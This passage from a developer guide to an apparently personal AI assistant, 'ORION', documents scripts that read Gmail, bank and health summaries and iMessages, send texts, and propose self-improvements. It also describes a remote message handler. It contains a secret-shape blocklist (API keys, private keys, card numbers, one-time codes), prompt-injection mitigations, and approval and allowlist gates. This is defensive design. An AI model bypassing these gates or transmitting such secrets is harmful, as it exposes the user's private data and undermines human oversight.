| `--max <N>` | result count; default 5 (`DEFAULT_MAX`), clamped to 1..25 (`MAX_LIMIT`); non-integer falls back to 5 |
| `--help` / `-h` | prints usage and exits 0 |

  Missing query (and no `--thread`) prints a hint to stderr and exits 2 (101-107). Errors from `gog` go to stderr with exit 1 (150-154).
- **How it works.** Parse; if `--thread`: `getThread`, print `renderFull` (or `No thread with id ...`); else `searchThreads(ORION_ROOT, query, max)`; empty result prints `No mail matched "<query>".`; with `--full` each thread is fetched in parallel and a failed fetch becomes `{thread:{id, messages:[]}, error}`; otherwise `withSnippets` then `summarise` then `renderSummaries`.
- **Contracts.** Output examples: summaries as in 7.5.3. Env: `GOG_KEYRING_PASSWORD` from `.env` (via client). No files written.
- **Calls out to.** `gog gmail search` and `gog gmail thread get` (argv in 7.5.2). Per default search: 1 + N `gog` invocations.
- **Callers.** ORION via exec (`plugin/workspace/AGENTS.md:291`, `TOOLS.md:66`, `PLAYBOOK.md:9`); the plugin itself runs it for the **prep card** (`plugin/orion-control/src/executors.ts:3753`, query built from terms extracted mechanically from an event title) and for **trip detection** with the fixed query `confirmation OR itinerary OR boarding OR reservation` (`executors.ts:3860-3863`, 30 s timeout). Those two are fixed queries on purpose: "a message Orion read cannot steer what he goes looking for next" (comment 3856-3858); the catalog entry for `prep_card` notes the fan-out to this script (`catalog.ts:3262-3265`).
- **History.** `154c3fb` 2026-08-04 first version; `93e9a42` 2026-08-20 rewrote it on top of the client and formatter ("WHAT CHANGED AND WHY" header, lines 11-26).
- **Gotchas.** Gmail query syntax is passed through; ORION can search any mail. There is no allowlist of queries. Reading is the only thing it can do, but reading is itself sensitive (see 7.12).

#### 7.5.5 `orion-gmail-latest`

- **What it is.** The "newest inbox thread" shortcut (77 lines). Same engine as search with the fixed query `in:inbox`.
- **Where.** `parseArguments` 27-47; `main` 49-72.
- **Flags.** `--full` or `--body` (cleaned bodies), `--max N` (default 1, clamped 1..10, `MAX_LIMIT = 10`), `--json`, `--help`/`-h` (usage: `orion-gmail-latest [--full] [--max N] [--json]`). Unknown arguments are silently ignored (no else branch).
- **How it works.** `searchThreads(ROOT, "in:inbox", max)`; none found prints "No inbox email found." (or `{"results":[]}`); `--full` fetches threads in parallel (a failure here throws, unlike search) and prints `renderFull` joined by `\n\n===\n\n`; default uses `withSnippets` then `summarise` then `renderSummaries`.
- **Calls out to.** Same two `gog` invocations. Also called by `orion-connect list` as the Gmail liveness probe (`orion-connect:78`).
- **Gotchas.** Because `list` calls this, a revoked token makes `list` print "DISCONNECTED" with `gog auth manage` as the fix (`orion-connect:80`).
- **Walk it yourself (all of 7.5).**
  1. `sed -n 17,20p scripts/lib/gmail-client.mjs` and `sed -n 64,67p scripts/lib/gmail-client.mjs` (safety flags appended in the function).
  2. `sed -n 36,62p scripts/lib/gmail-format.mjs` for the footer list and the 40-char floor.
  3. `grep -n "gmail" plugin/orion-control/src/executors.ts` to see where code, not the model, searches mail.
  4. `node scripts/orion-gmail-search --help` is harmless (exits before any network). Do not run a real search unless you want a live Gmail read.
  5. `npx vitest run plugin/orion-control/src/gmail-format.test.ts` (pure).
- **Questions to ask your tutor (7.5).**
  1. Why are `--readonly` and `--gmail-no-send` appended inside `gog()` rather than passed by callers? What does a missing flag cost?
  2. What is the difference between `orion-gog` and `gmail-client.mjs` in terms of safety?
  3. Why does the default search cost 1+N calls, and why was `--full` still worth a flag?
  4. Explain `MIN_BODY = 40` and the history behind lowering it from 160.
  5. What does `--sanitize-content` change, and why is "untrusted data" now a mechanism instead of a policy?
  6. Why are the prep-card and trip-detection queries fixed in code?


---

### 7.6 `orion-finance` (read-only money summary)

- **What it is** — A 30-line node CLI that prints Nick's bank picture from one JSON file that the Mac app writes after each bank refresh. ORION never talks to the bank: the Plaid link lives in the Swift app, and the script header names the writer as `native/Orion/.../FinanceExport.swift` (`scripts/orion-finance:3-4`). Called `model` in the §11 index.
- **Where** — `scripts/orion-finance:10-30` (the whole file).
- **How it works**
  1. `FILE = process.env.ORION_FINANCE_FILE || ~/.openclaw/orion-controlled/finance-summary.json` (`:13`).
  2. A missing or unparsable file prints "No bank summary yet: open ORION > Finances once ..." and exits 1 (`:14-16`).
  3. File age comes from `statSync(FILE).mtimeMs` (`:17`). If older than 24 hours the first line adds "N days old" (`:26`), so the model can say the numbers are stale instead of presenting them as current.
  4. `--json` dumps the summary (`:19`); `recent` prints `summary.recent` as `date  amount  name (pending) [category]` (`:22-25`); the default prints accounts as `name ....mask: current (available ...)`, then spent this week/month, income this month, top categories and recurring charges (`:26-30`).

```js
// scripts/orion-finance:13
const FILE = process.env.ORION_FINANCE_FILE || join(homedir(), ".openclaw/orion-controlled/finance-summary.json");
```

- **Contracts** — Input: the summary keys it reads are `writtenAt`, `accounts[{name,mask,current,available,currency}]`, `spentThisWeek`, `spentThisMonth`, `incomeThisMonth`, `topCategoriesThisMonth[{category,total}]`, `recurring[{name,amount}]`, `recent[{date,amount,name,pending,category}]`. Output: plain text or JSON on stdout. Currency falls back to USD (`:21`). Env var: `ORION_FINANCE_FILE` (tests).
- **Calls out to** — Nothing. No network, no Keychain; no write of any kind.
- **History** — `d9cf665` 2026-08-11 introduced the `orion-*` wrapper toolbelt (the earliest commit touching it in `git log`).
- **Gotchas & lessons** — The file holds real balances and account masks, so anything that reads it should be treated as private context (it is not sent anywhere by this script). The "age" check only looks at file mtime, not at `writtenAt`. There is no test **(none found)**.
- **Walk it yourself** — `sed -n 1,30p scripts/orion-finance`; `ls -la ~/.openclaw/orion-controlled/finance-summary.json` (metadata only; do not paste its contents anywhere); `ORION_FINANCE_FILE=/nonexistent node scripts/orion-finance` shows the no-summary message.
- **Questions to ask your tutor** — (1) Why does ORION read a file the app wrote instead of calling Plaid itself? (2) What does the 24-hour age note protect against? (3) Where would a second currency break the output? (4) Which side owns the schema of `finance-summary.json`, and what would break if the Swift side renamed `recurring`?

---

### 7.7 `orion-health` (sleep, recovery, today's tracking)

- **What it is** — A 45-line read-only report over the app's health log (WHOOP numbers plus what Nick logged by hand). Born from a specific failure: asked "how'd I sleep last night", ORION said it had no sleep data while WHOOP numbers sat in the log (`scripts/orion-health:2-4`, dated 2026-09-29).
- **Where** — `scripts/orion-health:11-45`.
- **How it works**
  1. Read `~/.openclaw/orion-controlled/health-log.json` (`:12`); unreadable prints "The health log could not be read." and exits 1 (`:13`).
  2. **The day turns at 4 AM**: `today = key(new Date(Date.now() - 4*3600_000))` using the `en-CA` date format (`:14-15`). A 1 AM question is about the previous day.
  3. Last seven day keys (`:17`). `scored` is the days with `recovery` or `sleepHours`; if today has neither yet ("Before WHOOP scores the new day"), the report falls back to the latest scored night (`:19-24`) and reports which day it used in `wearableDay`.
  4. Builds `out`: sleep hours/performance, recovery, HRV, resting HR, strain, water (`waterBottles` vs a hard-coded goal of 9, `:32`), food (sum of calories and protein from `nutritionLog[today]`, goal `nutritionGoals.calories` default 2200, `:33-34`), supplements taken, last `bed` event from `sleepLog`, and a seven-day table (`:27-38`).
  5. `--json` prints it; otherwise three text lines plus a recovery sparkline of numbers (`:39-45`). Missing values print "not recorded", never 0 (`:40`).
- **Contracts** — Reads one file, writes nothing. The writers of that file are the Mac app and `orion-log` (water/food, §9.7), which share a `<file>.lock`.
- **Calls out to** — Nothing.
- **History** — Created 2026-09-29 (header). The earlier `git log` hash for the wrapper family is `d9cf665`.
- **Gotchas & lessons** — The water goal (9) and calorie default (2200) are hard-coded values in the script, not read from config. "Not recorded" versus zero matters: a model told "0 hours" would invent a bad night. No test **(none found)**.
- **Walk it yourself** — `sed -n 14,24p scripts/orion-health`; `node scripts/orion-health --json | head -c 800` (reads your local log only).
- **Questions to ask your tutor** — (1) Why subtract four hours before computing the date? (2) Why fall back to the latest scored night instead of reporting today's empty values? (3) What would you change so the water goal comes from the app's settings? (4) Why do missing numbers print "not recorded"?

---

### 7.8 `orion-messages` (read iMessages)

- **What it is** — A 476-line read-only CLI over `~/Library/Messages/chat.db` so ORION can answer "what did Carla say". It exists because the app's `MessagesReader` was only wired to a tab and the agent had no route to it (`scripts/orion-messages:3-9`). Sending is deliberately elsewhere (7.10).
- **Where** — `scripts/orion-messages`: header 2-47; `appleDate` 73-78; `sqlLike` 90-95; `queryFile` 105-132; `contactIndex` 154-206; `personFor` 208-218; `handlesMatching` 220-232; `bodyFrom`/`searchableBody` 255-272; `SELECT` shared query 273-283; `render` 296-315; `main` and the verbs 317-476.
- **How it works**
  1. Verbs: `recent [n]`, `from "<name or number>" [n]`, `search "<text>" [n]`, `chats [n]`, `whoami`, `contacts-status` (`:321-460`). `limit` is the first all-digit argument, clamped 1..200, default 20 (`:318`).
  2. **Read-only and immutable.** `queryFile` runs `/usr/bin/sqlite3 -json "file:<path>?mode=ro&immutable=1" <sql>` (`:111-115`). `mode=ro` so nothing can edit his history; `immutable=1` because Messages holds a WAL lock while running and a normal open fails "exactly when he is using it".
  3. **Full Disk Access.** A denial matching `authorization denied|unable to open|not permitted` becomes exit code 4 with a message naming the responsible process and saying "This is not an empty inbox" (`:119-128`). An empty result prints "No messages matched. (This is a real empty result...)" (`:310-312`). The two are kept apart on purpose.
  4. **Apple's clock.** `date` is nanoseconds since 2001-01-01 on modern rows and seconds on old ones; anything above 1e11 is treated as nanoseconds, then `+978307200` (`:72-78`). All printed times are local (`toLocaleDateString("en-CA")`, `:285-294`) because `toISOString()` is UTC and rolls the date at 20:00 New York time.
  5. **The body.** `SELECT` asks for `hex(m.attributedBody)` because a BLOB cannot ride through `sqlite3 -json`; `bodyFrom` calls `messageBody` from `scripts/lib/imessage-typedstream.mjs` (7.9). `search` can only LIKE on `m.text` in SQL, so it fetches `m.text LIKE ... OR m.text IS NULL` up to 4000 rows and filters the decoded bodies in JS (`:353-374`), otherwise it would miss the newest messages. `searchableBody` only matches real text, never the `[attachment]` or `[unreadable message body]` markers.
  6. **Names.** `contactIndex` reads `AddressBook-v22.abcddb` (and `Sources/*/AddressBook-v22.abcddb`) with sqlite directly, keyed by the **last ten digits** of a number or the lower-cased email (`:154-206`). It is best effort: no address book means raw handles, "a worse answer but never a wrong one".
  7. **LIKE safety.** `sqlLike` escapes `\`, `%`, `_` and `'` and adds `ESCAPE '\'` so a "name" of `%` cannot match every conversation (`:90-95`).
  8. `chats` uses `IFNULL(NULLIF(c.display_name,''), h.id)` because a 1:1 chat has display_name `''`, not NULL (`:376-414`, the comment records that the first version returned only group chats). `whoami` asks `PRAGMA table_info(chat)` for the real column names (`account_login`, and `service_name` or `service`) instead of hard-coding them (`:416-458`).
- **Contracts** — Output is one line per message: `YYYY-MM-DD HH:MM  who: body`, oldest first (`render` reverses, `:314`). `who` is `me`, the group title, a contact name or the raw handle. Exit codes: 2 usage, 3 no database, 4 Full Disk Access, 5 query failed. Reached by the model through the catalog's messages-read action (`plugin/orion-control/src/catalog.ts:366`); `orion-messages` itself is not on the exec allowlist (`catalog.ts:2977-2978` says `whoami` was unreachable for that reason until it became an action).
- **Calls out to** — `/usr/bin/sqlite3` against `chat.db` and the AddressBook databases; nothing else.
- **History** — `37c29fd` 2026-09-30 "plan, remind, observe, adapt" and `c2eda84` 2026-09-30 "truthful replies, eval harness and connectors" (the commits that touch it in `git log`). The typedstream decoder replaced a "longest printable run" guess after Nick's inbox printed `NSObject` for nine of twelve short messages (7.9).
- **Gotchas & lessons** — (1) Full Disk Access belongs to the *responsible process* (Terminal, or the OpenClaw gateway), not to the script. (2) `whoami` shipped untested and failed on first use with `no such column: service`. (3) Tapbacks are excluded by `associated_message_type = 0`. (4) `search` is bounded to 4000 rows, so very old matches are missed on purpose.
- **Walk it yourself** — `sed -n 66,95p scripts/orion-messages`; `grep -n 'immutable' scripts/orion-messages`; `node scripts/orion-messages contacts-status` (reads only the address-book databases and prints counts; needs Full Disk Access for your terminal).
- **Questions to ask your tutor** — (1) Why `immutable=1` and what is the risk of it? (2) Why does an empty inbox need a different message from a denied read? (3) Why match phone numbers on the last ten digits? (4) Why does `search` filter in JS after a wider SQL fetch? (5) Why is reading in one script and sending in another?

---

### 7.9 `imessage-typedstream.mjs` (decoding `attributedBody`)

- **What it is** — A 258-line pure decoder (`scripts/lib/imessage-typedstream.mjs`) for the NSAttributedString "typedstream" blob that modern chat.db rows use instead of `message.text`. Its header is the best post-mortem in the repo: the first reader took the longest printable run in the blob, so a two-character "ok" came back as the eight-character class name `NSObject` (header `:1-75`).
- **Where** — Signature constant `:78`; `NEW_BYTE_STRING` (`84 01 2b`) `:81`; `ARCHIVE_TOKENS` backstop set `:96`; `ATTACHMENT_PLACEHOLDER` (U+FFFC) `:115`; `UNREADABLE_MARKER` `:118`; `ATTACHMENT_MARKER` `:121`; `readInteger` `:131`; `readDelimitedString` `:164`; `interpret` `:202`; `decodeAttributedBody` `:219`; `messageBody` `:244`.
- **How it works**
  1. The blob must begin `04 0b "streamtyped"`; otherwise it returns `{status:"unreadable"}` rather than falling back to scanning (`:219-232`).
  2. `readDelimitedString` finds the first `84 01 2b` token (type encoding `+`), reads a typedstream integer length (1 byte for 0..127, `81` + int16 LE, `82` + int32 LE, `83` + int64 LE, `:131`), then takes exactly that many UTF-8 bytes. The body ends where the archive says it ends, so no mojibake tail and no `+8` prefix on multi-byte text.
  3. `interpret` strips U+FFFC attachment placeholders: no text left plus a placeholder gives `{status:"attachment", text:"[attachment]"}`; empty gives `empty`; a text equal to an archive token gives `unreadable`; else `{status:"text"}` (`:202-217`).
  4. `messageBody({text, bodyHex})` prefers the `text` column, and falls through to the blob for an attachment-only `text` that may have a caption (`:244-258`).
- **Contracts** — Returns `{status: "text"|"attachment"|"empty"|"unreadable", text}`. It never returns a class name; "a wrong message is worse than a missing one". Callers: `scripts/orion-messages:255-272`.
- **Calls out to** — Nothing (pure).
- **History** — Added `c2eda84` 2026-09-30 with the truthful-replies batch **(inferred from `git log` for the file; the log lists that commit as the only one touching it)**.
- **Gotchas & lessons** — A blocklist of class names was tried and rejected: "it only renames the failure" (`:25-27`). The `81`-prefixed two-byte length is the common case after one sentence, so a reader that only handles one-byte lengths seems to work in tests and truncates real messages. No test file with typedstream, imessage or messages in its name exists under `tests/` **(none found)**.
- **Walk it yourself** — read the header `sed -n 1,75p scripts/lib/imessage-typedstream.mjs`, then `sed -n 131,200p` for the integer and string readers.
- **Questions to ask your tutor** — (1) Why does a "longest printable run" heuristic fail exactly on short replies? (2) What does the `84 01 2b` token mean and why is the first `+` string the message? (3) Why return a status instead of an empty string? (4) Why keep the blob as hex between sqlite and JS?

---

### 7.10 `orion-messages-send` (the dangerous half)

- **What it is** — The only script that sends an iMessage/SMS as Nick (338 lines). It is its own file so "may read my texts" and "may send texts as me" are separate allowlist and catalog decisions (`scripts/orion-messages-send:9-17`).
- **Where** — `scripts/orion-messages-send`: header 2-37; `refuseDuringEval` `:39,46`; `MAX_LENGTH = 2000` `:48`; argument shape `:50-65`; control-character check `:66-75`; `SECRET_SHAPED` `:86`; `resolveName` `:132`; `resolveRecipient` `:196`; AppleScript `SCRIPT` `:237`; dry run `:263-277`; send and error mapping `:279-337`.
- **How it works**
  1. `refuseDuringEval("the message")` stops the script during eval mode (4.10).
  2. Arguments: `[--dry-run] "<recipient>" "<message>"`. Missing recipient or blank body fails with a usage line (`:60-62`); body over 2000 characters fails (`:63-65`); control characters in body or recipient fail (`:73-75`).
  3. **Secret-shaped bodies are refused**: API-key shapes (`sk-`, `ghp_`, `xox*-`, `AKIA`, JWT `eyJ...`), PEM private keys, 13-16 digit card numbers, "one-time/verification/security/auth/2fa/otp code", and `password|passcode|api key ... is|:|=` (`:86-92`). The comment: secrets arrive "by accident far more often than by intent".
  4. **Strict recipient resolution.** An email or phone-shaped string is used as is; a name goes through `resolveName` (Contacts, then people he has actually texted) and must match **exactly one** handle: zero fails with code 6, more than one fails with code 7 listing up to six candidates and "Refusing to guess" (`:196-225`).
  5. `--dry-run` prints `to`, `handle`, `body`, `length` and exits 0 without sending (`:263-277`).
  6. The send is `/usr/bin/osascript -e SCRIPT <handle> <body>` with a 30 s timeout; handle and body travel as AppleScript `argv`, never interpolated into the source, so quotes and backslashes cannot change the script (`:229-262`, `:279-284`). The script tries the iMessage account first and falls back to SMS.
  7. Failure mapping (`:296-337`): a timeout (macOS never answers a request it cannot prompt for; the 30 s kill is caught at `:309-319`), an Automation denial (`-1743` branch, `:322-331`), and a generic failure that says "Nothing was sent" (exit 10, `:337`).
- **Contracts** — stdout on success: `sent to <label> via iMessage|SMS`. This script is "the last gate, not the only one" (`:19-27`): the plugin refuses `messages_send` unless the recipient appears in Nick's own words and the send carries an approval hash bound to the exact recipient and body (`plugin/orion-control/src/catalog.ts:3476-3483`, tier discussion at `:3016`).
- **Calls out to** — `/usr/bin/sqlite3` (read-only, for resolution), `/usr/bin/osascript` driving Messages.app.
- **History** — `c2eda84` 2026-09-30 "truthful replies, eval harness and connectors" is the commit in `git log` that touches it.
- **Gotchas & lessons** — macOS Automation consent attaches to the responsible process and the first request raises a dialog only a human can click. `--dry-run` is how the path is verified without putting text on someone's phone. There is no unsend, hence strict ambiguity refusal.
- **Walk it yourself** — `sed -n 86,100p scripts/orion-messages-send` (the secret shapes); `node scripts/orion-messages-send --dry-run "+15555550100" "hello"` is safe (prints the dry-run block; does not send, and the number is a placeholder); `sed -n 237,262p scripts/orion-messages-send`.
- **Questions to ask your tutor** — (1) Why can this script not decide whether the recipient was Nick's idea, and where is that decided? (2) Why must a name match exactly one handle? (3) Why pass body and handle as osascript `argv`? (4) What would you add to `SECRET_SHAPED` and what false positives would it cost? (5) Why is a TCC refusal reported differently from other failures?

---

### 7.11 `orion-learn` (propose, never apply)

- **What it is** — A 512-line CLI that reads ORION's own session history, finds repeating failure classes, and writes **one markdown file of proposals** for a human to accept or reject. Its stated ceiling: it never edits `AGENTS.md`, `SOUL.md`, config or the exec allowlist, because "an assistant that edits its own instructions on the strength of its own reading of its own logs has no error-correcting term anywhere in the loop" (`scripts/orion-learn:3-9`). The pipeline is PROPOSE, TEST (`orion-bench` or Nick), ACCEPT IF BETTER or ROLLBACK IF WORSE; this script owns the first box.
- **Where** — `scripts/orion-learn`: paths `:34-38`; flag parsing `:40-59`; `readJsonl` `:61`; `allowlist` `:85`; `sessions` `:111`; `load` `:127`; `proposals` `:292`; `judge` `:431`; report `:459`, write `:500`.
- **How it works**
  1. Reads `~/.openclaw/agents/main/sessions` (`.jsonl` plus `.trajectory.jsonl`, the same files `orion-trace` reads), `~/.openclaw/exec-approvals.json` and `~/.openclaw/workspace/AGENTS.md`, all read-only (`:34-36`).
  2. Flags: `--days N`, `--last N`, `--dry-run`, `--verbose`, `--judge`. A non-positive or non-numeric value exits 2, because a typo'd `--days x` must not quietly mean "everything" (`:41-52`).
  3. `load` classifies each session into findings: causes such as `shell-operators-on-allowed-binary`, `missing-capability`, `tool-name-as-shell-command`, `catalog-action-as-shell-command`, `guarded-raw-path`, `subcommand-as-program`, plus `hang`, `retry`, `unstored`, `blind`, `abort` (`:292-303`).
  4. `proposals()` returns objects `{title, severity, signal, already, diagnosis, change, text, test, rollback, list}`. `already` checks whether AGENTS.md already says the rule (`covered(...)`). Example: if the model keeps hand-grepping the memory tree, propose making `orion-recall` the only route (`:312-322`). Routing mistakes are explicitly *not* fixed by widening the allowlist: "Never add these heads to the exec allowlist".
  5. `--judge` sends each proposal to local Ollama `gpt-oss:20b` at `http://127.0.0.1:11434/api/generate` (300 s timeout) for a terse sceptical second opinion; a dead Ollama yields "(judge unavailable ...)" and the report still stands (`:431-455`).
  6. Writes `~/Desktop/ORION/docs/planning/learning-proposals.md` (`OUT`, `:37`, written at `:500`) with a header stating **NOTHING HERE HAS BEEN APPLIED** (`:459-470`), unless `--dry-run`.
- **Contracts** — Writes exactly one file, the proposals report. Console summary lists `P1 [high] title` with signal counts.
- **Calls out to** — Local Ollama only when `--judge`.
- **History** — `37c29fd` 2026-09-30 "plan, remind, observe, adapt" is the commit touching it in `git log`; §10.1 notes it is classed OPERATIONAL by self-repair (`selfrepair.ts:354-367`).
- **Gotchas & lessons** — The output path is outside `docs/learn/` and inside the repo's `docs/planning/`, so running it dirties the worktree. Proposal text is drafted for Nick to paste; nothing applies it.
- **Walk it yourself** — `node scripts/orion-learn --dry-run --days 1` (reads local session files, prints the report, writes nothing); `sed -n 292,330p scripts/orion-learn`.
- **Questions to ask your tutor** — (1) Why is a ceiling of "propose only" a design, not an unfinished feature? (2) What does `already` prevent? (3) Why does the router, not the allowlist, get fixed for catalog-as-shell mistakes? (4) What risks does `--judge` add and how are they contained?

---

### 7.12 Cross-cutting: secrets, gates, what reaches a model

- **Secrets by name only.** Gmail OAuth lives in the `gog` CLI's own store (7.5); Canvas and TfL keys are read from Keychain items by `orion-connect` (7.2); the Plaid link is the app's. None of the 7.6-7.11 scripts handles a credential, but `orion-messages-send` actively *refuses to transmit* credential-shaped text (`scripts/orion-messages-send:86-92`).
- **Read versus write is split by file.** `orion-messages` and `orion-messages-send` are two scripts; `orion-gog` (7.5) and `gmail-client.mjs` append `--readonly` and `--gmail-no-send`; `orion-finance` and `orion-health` read single local files. A write path is always its own entry in the catalog (`messages_send` has its own tier and approval hash).
- **What reaches a model.** Message bodies, mail snippets and bank summaries become tool results the local or cloud model reads. That is the reason Gmail has `--sanitize-content` (7.5) and why the reply linting in chapter 05 treats connector text as untrusted data.
- **Stale or denied is not empty.** Four scripts in this part say so explicitly: `orion-finance` (age note), `orion-health` ("not recorded"), `orion-messages` (denied read vs empty result), `orion-learn` (typo'd window refuses).
- **Questions to ask your tutor** — (1) List every place in this chapter where "unknown" is printed differently from "none". (2) Which of these scripts could leak personal data into a cloud-model turn and which control stops it?

---

## 8. Remote: phone and Discord handler

> Snapshot 6c93032 (2026-10-14). Covers `scripts/orion-remote`, `scripts/orion-remote-bridge`, `scripts/orion-remote-install`, `scripts/lib/remote/*.mjs`, `scripts/lib/orion-remote-audit-stats.mjs`, `scripts/lib/audit/chat-log.mjs`. All of these are committed and unmodified in the dirty worktree (the dirty files are plugin `dist/` and `docs/evals/`).

### 8.0 Read this first: what "remote" is, and what it is not

Three things that the brief for this chapter assumed, and the code does not do:

1. **There is no HTTP server.** `scripts/orion-remote` is a one-shot Node CLI. Each message starts a fresh `node` process that runs once and exits (`scripts/orion-remote:1764-1870`). There are no routes, no listening socket, no pairing flow, no tokens issued by ORION, no sessions held in the process. `scripts/orion-remote-bridge` is the only long-lived process, and it only makes **outbound** connections (a WebSocket to Discord and REST calls to Discord). Its header says there is "no listening socket anywhere in this file" (`scripts/orion-remote-bridge:12-18`).
2. **Authentication is an allowlist of sender names**, not a token or a pairing code. The sender is a string in `--from <sender>`. On Discord it is the numeric Discord author id. On the phone it is the literal `phone` (`native/OrionMobile/Sources/MobileCore/LinkSnapshot.swift:49`, `LinkSchema.sender`). The allowlist is the env var `ORION_REMOTE_ALLOW` (comma list, lower-cased, default `local`). Discord's own bot credential is a different thing: a value named `ORION_DISCORD_BOT_TOKEN` read from the environment or a `.env` file (not the Keychain), used only by the bridge to log in to Discord.
3. **There is no streaming, no photo/file attachment handling, and no approval UI inside these files.** A reply is one block of text, printed to stdout when the model turn is complete. Files are only *listed* (`files desktop|documents|downloads`, metadata only). Discord attachments are ignored (the bridge reads only `message.content`). Approvals are a text verb (`approve <id>`), resolved against ids minted elsewhere.

The mental model that is correct:

```
 PHONE (iPhone app)                              DISCORD (DM or @mention)
   |  private CloudKit record `LinkCommand`         |  wss://gateway.discord.gg  (outbound WebSocket)
   v                                                v
 ORION Link helper app (native/OrionLink)       scripts/orion-remote-bridge  (launchd KeepAlive)
   |  spawns, 180 s timeout                         |  spawns, 180 s timeout, one process per message
   +----------------------+-------------------------+
                          v
   node ~/.openclaw/orion-remote/scripts/orion-remote handle --from <sender> --id <id> --at <ms> [--mode chat] -- "<text>"
                          |   (the INSTALLED copy, not the repo copy)
                          |   guards: allowlist -> device routing -> LOCK ORION -> freshness -> replay/rate limit -> size
                          v
        a) a fixed verb (status, pause, ..., files)  -> handler runs, no model
        b) anything else (or --mode chat)            -> askBrain -> `openclaw agent --session-key ... --json --message-file <file>`
                          |                              -> OpenClaw gateway -> the model, with the ORION plugin gate
                          v
   reply on stdout (exit 0 = ok, exit 1 = refusal with text, other = failure)
```

Companion chapters: the plugin-side checks that run on the same turn are in [05_plugin_turn_pipeline.md](05_plugin_turn_pipeline.md) (its section 17 covers this wrapper from the plugin side, and it holds the depth on `claims.mjs` and `reply-lint.mjs`). The end-to-end phone walk-through with the Swift hops is in section 8.7 below, and a shorter version is in [10_end_to_end_walkthroughs.md](10_end_to_end_walkthroughs.md).

#### In this section

| # | Component | Lines |
|---|---|---|
| 8.1 | `orion-remote`: structure, CLI, flags, the three modes | 1870 |
| 8.2 | `orion-remote`: the guard pipeline (`handleUnlocked`) | 1510-1760 |
| 8.3 | `orion-remote`: the brain call (`askBrain`, `askBrainOnce`, truth check, context) | 445-895 |
| 8.4 | `orion-remote`: verbs and handlers, approvals, the `agent` verb | 195-445, 897-1508 |
| 8.5 | `orion-remote-bridge` (Discord gateway client) | 615 |
| 8.6 | `orion-remote-install` and the LaunchAgent | 209 |
| 8.7 | The phone path end to end (integrated trace, line numbers re-verified) | n/a |
| 8.8 | `scripts/lib/remote/*` (five modules) | 1-291 each |
| 8.9 | `orion-remote-audit-stats.mjs` and `audit/chat-log.mjs` | 73 and 103 |
| 8.10 | Reference tables: env vars, files on disk, exit codes, timeouts | n/a |

---

### 8.1 `scripts/orion-remote`: structure, CLI and flags

- **What it is** — The single handler for every inbound message from the phone and Discord. A Node ES module with a `#!/usr/bin/env node` shebang, 1870 lines, no extension. It is a command-line program: `orion-remote <command> [--flag value ...] [-- text]`. It decides whether a message is a fixed verb or conversation, enforces six guards, runs a verb handler or one model turn, writes an audit line, and prints the reply. It started on 2026-09-02 as a seven-verb mission-control vocabulary "with no fallthrough to a model" and was deliberately changed the same day to let free text reach the brain (the decision is recorded in the comment at `scripts/orion-remote:66-90`).
- **Where** — `scripts/orion-remote` (repo). The copy that actually runs is `~/.openclaw/orion-remote/scripts/orion-remote`, put there by `orion-remote-install` (section 8.6). The Swift helper and the Discord bridge both call the installed copy (`native/OrionLink/Sources/LinkCore/CommandRunner.swift:21-23`, and the bridge computes `REMOTE = join(ROOT, "scripts/orion-remote")` at `scripts/orion-remote-bridge:53`, where `ROOT` is the installed tree when launched from launchd).

#### Line-range outline of the file

| Lines | What is there |
|---|---|
| 1-32 | Header comment: threat model (inbound text is untrusted; the safety is a filter on the VOCABULARY, not the text); four rules (seven verbs matched exactly, args validated by shape in the dispatcher, text never reaches a shell, `approve` resolves exactly one id); transport is files by default. **Stale in places**: it says "seven verbs" and "no model", both superseded at 66-90. |
| 34-64 | Imports and path constants: `CONTROLLED = ~/.openclaw/orion-controlled`, `STATE = remote.json`, `INBOX`, `OUTBOX`, `AUDIT = remote-audit.jsonl`, `INBOUND = remote-inbound.json` (+ `.lock` dir; prefixed `eval-` in sandbox mode), `RUNNER_LOG`, `LOCK = lock.json`, `OPENCLAW = ~/.openclaw/bin/openclaw`. |
| 64 | `MISSION_BIN` (env `ORION_REMOTE_MISSION_BIN`, default `scripts/orion-mission`), a test seam recorded in the audit line when it differs. |
| 66-96 | "THE BRAIN" comment (Nick, 2026-09-02: "a remote way to directly speak to the orion brain"). `BRAIN_SESSION` (env `ORION_BRAIN_SESSION`, default `orion-app-v2`), `BRAIN_BIN` (env `ORION_BRAIN_BIN`, default the openclaw binary), `BRAIN_TIMEOUT_S = 90`. |
| 98-123 | Id shapes: `MISSION_RE`, `APPROVAL_RE` (`ap-` + 8 hex), `GATE_RE` (`A-` + 4 chars, no 0/O/1/I/L), `PRIORITIES`, agent actions, `TASK_ID_RE`, `PROJECT_RE`, terminal mission states. |
| 124-145 | Limits: `MAX_BYTES=200`, `MAX_TOKENS=8` (verb grammar), `MAX_BRAIN_BYTES=4000`, `RATE_WINDOW_MS=10 min`, `RATE_CAP=40`, `SEEN_KEPT=200`. |
| 147-163 | `MAX_ENVELOPE_AGE_MS = 10 min`, `DEVICE_ID` (env `ORION_DEVICE_ID`, else lower-cased hostname). |
| 165-178 | `SAFE_ROOTS` map: `desktop`, `documents`, `downloads` -> directories. `MAX_LISTED = 40`. |
| 180-193 | `allowedSenders()` — re-read from `ORION_REMOTE_ALLOW` on **every message** so revoking an account needs no restart. |
| 195-247 | `VERBS` table (12 verbs, aliases, min args, argument shapes), `ALIAS_TO_VERB`, `FILLER` words. |
| 249-252 | `fail()` — print `orion-remote: <msg>` to stderr and `process.exit(code)` (default 2). |
| 254-313 | State plumbing: `withStateLock` (lockfile `remote.json.lock`, 60 tries x 100 ms, steals a lock older than 15 s), `readState`, `writeState` (tmp + rename, mode 0600), `readInbound`/`writeInbound`, `audit()` (appends one JSON line with `at`). |
| 315-349 | Views over Orion's own nouns: `readJson`, `runnerMission`, `knownMission`, `signalRunner`/`livePid`/`stopRunner` (reads `missions/<id>/mission.lock` pid, signal 0 or SIGTERM), `withMission`. |
| 351-443 | `isLocked()`, `parse()` (verb grammar), `SHAPES` (argument validators), `checkArgs`, `HINTS`, `usage`. |
| 445-546 | `CHANNEL_BRIEF` (the transport text sent to the model on every message) and `briefFor(sender)` (keeps `@phone` or `@discord` tagged lines). |
| 548-665 | Phone-only live context: `todaySchedule`, `recentOutreach`, `watchQuestion`, `phoneLock`, `openCheckins`, `phoneContext()`. |
| 667-721 | Truth-check constants (`CHECK_DONE`, `NO_REPLY`, `CHECK_SILENT`, `CHECK_CANT`), `ESCALATION_MODEL`, `quickAnswer()` (exported). |
| 723-746 | `askBrain()` — quick answer, first turn, optional second turn. |
| 748-788 | `saveStandingRules()` — saves his stated rules before the model answers. |
